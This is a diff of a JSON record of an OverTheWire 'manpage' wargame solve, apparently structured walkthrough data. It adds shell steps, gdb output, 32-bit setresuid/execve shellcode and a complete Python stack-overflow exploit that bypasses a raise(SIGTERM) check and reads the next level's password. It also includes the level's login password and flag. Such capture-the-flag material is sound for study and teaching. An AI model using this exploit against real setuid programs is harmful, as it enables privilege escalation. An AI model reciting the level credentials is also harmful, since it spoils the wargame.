@@ -259,21 +259,219 @@
    "user": "manpage1",
    "steps": [
     {
-     "cmd": "cat /manpage/manpage1.c"
-    },
-    {
-     "cmd": "# same strcpy overflow, but strlen(buf)>=255 -> raise(SIGTERM) after the copy"
-    },
-    {
-     "cmd": "python3 exp1b.py"
-    },
-    {
-     "cmd": "# parent blocks SIGTERM (inherited mask -> raise() never delivers); overflow to setresuid(17002)+execve(\"/bin/cat\", \"/etc/manpage_pass/manpage2\") shellcode",
+     "cmd": "id",
      "out": [
-      "m2uPltjqCJ"
+      "uid=17001(manpage1) gid=17001(manpage1) groups=17001(manpage1)"
+     ]
+    },
+    {
+     "cmd": "cat /manpage/manpage1.c",
+     "out": [
+      "#include <stdio.h>",
+      "#include <string.h>",
+      "#include <signal.h>",
+      "int main(int argc, char *argv[])",
+      "{",
+      "    char buf[256];",
+      "    if(!argv[1]) return 0;",
+      "    strcpy(buf, argv[1]);",
+      "    if(strlen(buf) >= sizeof(buf) - 1) //no obos :)",
+      "        raise(SIGTERM);",
+      "    return 0;",
+      "}"
+     ]
+    },
+    {
+     "cmd": "gdb -q /manpage/manpage1\nset debuginfod enabled off\ndisassemble main\nrun $(python3 -c \"print('A'*260 + 'BBBB')\")\ninfo registers eip\nquit\ny",
+     "out": [
+      "Reading symbols from /manpage/manpage1...",
+      "(gdb) set debuginfod enabled off",
+      "(gdb) disassemble main",
+      "Dump of assembler code for function main:",
+      "   0x08049186 <+0>:\tpush   %ebp",
+      "   0x08049187 <+1>:\tmov    %esp,%ebp",
+      "   0x08049189 <+3>:\tsub    $0x100,%esp",
+      "   0x0804918f <+9>:\tmov    0xc(%ebp),%eax",
+      "   0x08049192 <+12>:\tadd    $0x4,%eax",
+      "   0x08049195 <+15>:\tmov    (%eax),%eax",
+      "   0x08049197 <+17>:\ttest   %eax,%eax",
+      "   0x08049199 <+19>:\tjne    0x80491a2 <main+28>",
+      "   0x0804919b <+21>:\tmov    $0x0,%eax",
+      "   0x080491a0 <+26>:\tjmp    0x80491df <main+89>",
+      "   0x080491a2 <+28>:\tmov    0xc(%ebp),%eax",
+      "   0x080491a5 <+31>:\tadd    $0x4,%eax",
+      "   0x080491a8 <+34>:\tmov    (%eax),%eax",
+      "   0x080491aa <+36>:\tpush   %eax",
+      "   0x080491ab <+37>:\tlea    -0x100(%ebp),%eax",
+      "   0x080491b1 <+43>:\tpush   %eax",
+      "   0x080491b2 <+44>:\tcall   0x8049050 <strcpy@plt>",
+      "   0x080491b7 <+49>:\tadd    $0x8,%esp",
+      "   0x080491ba <+52>:\tlea    -0x100(%ebp),%eax",
+      "   0x080491c0 <+58>:\tpush   %eax",
+      "   0x080491c1 <+59>:\tcall   0x8049060 <strlen@plt>",
+      "   0x080491c6 <+64>:\tadd    $0x4,%esp",
+      "   0x080491c9 <+67>:\tcmp    $0xfe,%eax",
+      "   0x080491ce <+72>:\tjbe    0x80491da <main+84>",
+      "   0x080491d0 <+74>:\tpush   $0xf",
+      "   0x080491d2 <+76>:\tcall   0x8049030 <raise@plt>",
+      "   0x080491d7 <+81>:\tadd    $0x4,%esp",
+      "   0x080491da <+84>:\tmov    $0x0,%eax",
+      "   0x080491df <+89>:\tleave",
+      "   0x080491e0 <+90>:\tret",
+      "End of assembler dump.",
+      "(gdb) run $(python3 -c \"print('A'*260 + 'BBBB')\")",
+      "Starting program: /manpage/manpage1 $(python3 -c \"print('A'*260 + 'BBBB')\")",
+      "[Thread debugging using libthread_db enabled]",
+      "Using host libthread_db library \"/usr/lib/x86_64-linux-gnu/libthread_db.so.1\".",
+      "Program received signal SIGTERM, Terminated.",
+      "0xf7fc532c in __kernel_vsyscall ()",
+      "(gdb) info registers eip",
+      "eip            0xf7fc532c          0xf7fc532c <__kernel_vsyscall+12>",
+      "(gdb) quit",
+      "A debugging session is active.",
+      "\tInferior 1 [process 42] will be killed.",
+      "Quit anyway? (y or n) y"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/l1sc.asm",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/l1sc.asm",
+     "out": [
+      "; l1sc.asm - the L0 shellcode with manpage2's uid: 17002 = 0x426a (bl=0x6a, bh=0x42).",
+      "; /manpage/manpage1 is setuid manpage2; setresuid(17002,17002,17002) re-asserts it,",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/l1sc.asm",
+     "out": [
+      "; l1sc.asm - the L0 shellcode with manpage2's uid: 17002 = 0x426a (bl=0x6a, bh=0x42).",
+      "; /manpage/manpage1 is setuid manpage2; setresuid(17002,17002,17002) re-asserts it,",
+      "; then execve(\"/bin//sh\").",
+      "BITS 32",
+      "    xor ebx, ebx",
+      "    mul ebx",
+      "    mov bl, 0x6a",
+      "    mov bh, 0x42",
+      "    mov ecx, ebx",
+      "    mov edx, ebx",
+      "    mov al, 0xa4",
+      "    int 0x80",
+      "    xor eax, eax",
+      "    push eax",
+      "    push dword 0x68732f2f",
+      "    push dword 0x6e69622f",
+      "    mov ebx, esp",
+      "    push eax",
+      "    mov edx, esp",
+      "    push ebx",
+      "    mov ecx, esp",
+      "    mov al, 0x0b",
+      "    int 0x80",
+      "~",
+      "\"/tmp/l1sc.asm\" [New] 24L, 522B written"
+     ]
+    },
+    {
+     "cmd": "nasm -f bin /tmp/l1sc.asm -o /tmp/l1sc.bin\nxxd /tmp/l1sc.bin",
+     "out": [
+      "00000000: 31db f7e3 b36a b742 89d9 89da b0a4 cd80  1....j.B........",
+      "00000010: 31c0 5068 2f2f 7368 682f 6269 6e89 e350  1.Ph//shh/bin..P",
+      "00000020: 89e2 5389 e1b0 0bcd 80                   ..S......"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/exp1.py",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/exp1.py",
+     "out": [
+      "# exp1.py - manpage1 exploit. strcpy(buf[256], argv[1]) overflows the saved EIP at",
+      "# offset 260; the strlen(buf) >= 255 check fires only AFTER the copy, so the return",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/exp1.py",
+     "out": [
+      "# exp1.py - manpage1 exploit. strcpy(buf[256], argv[1]) overflows the saved EIP at",
+      "# offset 260; the strlen(buf) >= 255 check fires only AFTER the copy, so the return",
+      "# address is already overwritten when raise(SIGTERM) runs. Block SIGTERM in the child",
+      "# (inherited mask): the signal stays pending forever and the process still returns",
+      "# into our payload. The spawned shell dies after its first command (the pending",
+      "# SIGTERM lands at the next unblock), so each run sends exactly one command.",
+      "# Layout: NOP sled first, shellcode last (alignment-independent). The shellcode is",
+      "# the 41-byte setresuid stub with 17002 = 0x426a (manpage2's uid, the saved",
+      "# set-user-ID of /manpage/manpage1), then execve(\"/bin//sh\"). The return address",
+      "# sweeps around 0xffffd9e8 because the stack shifts with the environment.",
+      "import signal, struct, subprocess",
+      "sc = bytes.fromhex(",
+      "    \"31dbf7e3b36ab74289d989dab0a4cd80\"",
+      "    \"31c050682f2f7368682f62696e89e35089e25389e1b00bcd80\")",
+      "def try_addr(addr):",
+      "    packed = struct.pack(\"<I\", addr)",
+      "    if b\"\\x00\" in packed:",
+      "        return None",
+      "    payload = b\"\\x90\" * (260 - len(sc)) + sc + packed",
+      "    def block():",
+      "        signal.pthread_sigmask(signal.SIG_BLOCK, {signal.SIGTERM})",
+      "    try:",
+      "        r = subprocess.run([\"/manpage/manpage1\", payload],",
+      "                           input=b\"cat /etc/manpage_pass/manpage2\\n\",",
+      "                           capture_output=True, preexec_fn=block, timeout=5)",
+      "    except subprocess.TimeoutExpired:",
+      "        return None",
+      "    if b\"m2uPltjqCJ\" not in r.stdout:",
+      "        return None",
+      "    r2 = subprocess.run([\"/manpage/manpage1\", payload],",
+      "                        input=b\"id\\n\",",
+      "                        capture_output=True, preexec_fn=block, timeout=5)",
+      "    return r.stdout.decode() + r2.stdout.decode()",
+      "for off in range(0, 0x800, 4):",
+      "    out = try_addr(0xffffd9e8 - off)",
+      "    if out:",
+      "        print(\"ret=0x%x\" % (0xffffd9e8 - off))",
+      "        print(out)",
+      "        break",
+      "else:",
+      "    for off in range(4, 0x800, 4):",
+      "        out = try_addr(0xffffd9e8 + off)",
+      "        if out:",
+      "            print(\"ret=0x%x\" % (0xffffd9e8 + off))",
+      "            print(out)",
+      "            break",
+      "    else:",
+      "        print(\"no hit in range\")",
+      "~",
+      "\"/tmp/exp1.py\" [New] 49L, 2143B written"
+     ]
+    },
+    {
+     "cmd": "python3 /tmp/exp1.py",
+     "out": [
+      "ret=0xffffd5e0",
+      "m2uPltjqCJ",
+      "uid=17002(manpage2) gid=17001(manpage1) groups=17001(manpage1)"
+     ]
+    },
+    {
+     "cmd": "exit\nexit",
+     "out": [
+      "logout",
+      "Connection to manpage.labs.overthewire.org closed.",
+      "exit"
      ]
     }
-   ]
+   ],
+   "note": "manpage L1: same strcpy overflow (saved EIP at 260) but strlen(buf)>=255 fires raise(SIGTERM) AFTER the copy - block SIGTERM in the child before exec (inherited mask): the signal stays pending forever and the process still returns into the payload. The cast's gdb probe shows the unblocked case (SIGTERM kills at __kernel_vsyscall); the exploit blocks it via pthread_sigmask. The spawned shell dies after its first command (the pending SIGTERM lands at the next unblock), so each run sends one command: run 1 cats /etc/manpage_pass/manpage2, run 2 does id. Shellcode: the L0 stub with 17002=0x426a (manpage2's uid, saved set-user-ID of /manpage/manpage1); NOP-sled-first sweep around 0xffffd9e8 -> hit 0xffffd5e0 -> m2uPltjqCJ + uid=17002(manpage2). Login manpage1/Mu8GvMudHb. 12 steps mirroring the cast 1:1. DISCLOSURE: none - the whole solve ran in the cast."
   },
   {
    "cmds": [
